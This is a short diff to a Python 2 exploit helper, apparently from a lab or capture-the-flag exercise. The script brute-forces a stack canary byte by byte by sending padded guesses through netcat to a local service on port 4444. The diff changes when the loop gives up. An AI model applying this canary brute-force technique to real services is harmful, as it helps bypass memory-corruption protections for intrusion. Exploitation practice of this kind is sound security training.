@@ -22,12 +22,13 @@ while index!=4:
         buff=-1
         while re.search(sys.argv[2],grep_stdout) is None:
                 buff+=1
+                if buff==256:
+                        print "[-] Cookie introuvable"
+                        exit(-1)
                 p = Popen(['nc','localhost','4444'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
                 grep_stdout = p.communicate(input='f'*int(sys.argv[1])+Cookie+str(chr(buff)))[0]
                 print grep_stdout
-                if buff>127:
-                        print "[-] Cookie introuvable"
-                        exit(-1)
+
         Cookie+=str(chr(buff))
         index+=1
  
